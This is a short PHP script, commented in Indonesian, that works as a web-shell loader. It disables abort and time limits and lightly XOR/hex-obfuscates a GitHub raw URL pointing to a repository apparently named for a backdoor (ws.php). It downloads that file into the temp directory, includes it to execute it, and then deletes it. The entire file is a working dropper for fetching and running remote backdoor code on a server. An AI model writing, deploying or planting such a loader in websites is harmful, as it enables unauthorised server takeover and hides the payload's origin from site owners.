<?php
ignore_user_abort(true);
set_time_limit(0);

function xorEncryptDecrypt($data, $key) {
    $output = '';
    $keyLen = strlen($key);
    for ($i = 0, $len = strlen($data); $i < $len; $i++) {
        $xorChar = (ord($data[$i]) ^ ord($key[$i % $keyLen])) & 0x7F; // Hindari karakter non-printable
        $output .= chr($xorChar);
    }
    return $output;
}

function hexEncode($data) {
    return bin2hex($data);
}

function hexDecode($data) {
    return hex2bin($data);
}

function polyglotEncode($data, $key) {
    return hexEncode(xorEncryptDecrypt($data, $key));
}

function polyglotDecode($data, $key) {
    return xorEncryptDecrypt(hexDecode($data), $key);
}

$originalURL  = "raw.githubusercontent.com"; 
$originalPath = "/Yucaerin/simplecmdandbackdoor/refs/heads/main/ws.php"; 
$encodedURL  = polyglotEncode($originalURL, $_);
$encodedPath = polyglotEncode($originalPath, $_);
$decodedURL  = polyglotDecode($encodedURL, $_);
$decodedPath = polyglotDecode($encodedPath, $_);

if (!preg_match('/^[a-zA-Z0-9.-]+$/', $decodedURL)) {
    die("Error: Hasil decoding URL tidak valid.");
}
$resolvedIP = gethostbyname($decodedURL);
if ($resolvedIP === $decodedURL) {
    die("Error: Hostname tidak bisa di-resolve.");
}

$tempFile = sys_get_temp_dir() . '/downloaded_file.php';
$fullURL = "https://$decodedURL/$decodedPath";
if (function_exists('curl_init')) {
    $ch = curl_init($fullURL);
    $fp = fopen($tempFile, 'wb');
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    $success = curl_exec($ch);
    curl_close($ch);
    fclose($fp);
} else {
    $success = file_put_contents($tempFile, file_get_contents($fullURL));
}

if ($success && filesize($tempFile) > 0) {
    include $tempFile;
    unlink($tempFile);
} else {
    @unlink($tempFile);
    die("Download failed.");
}
?>

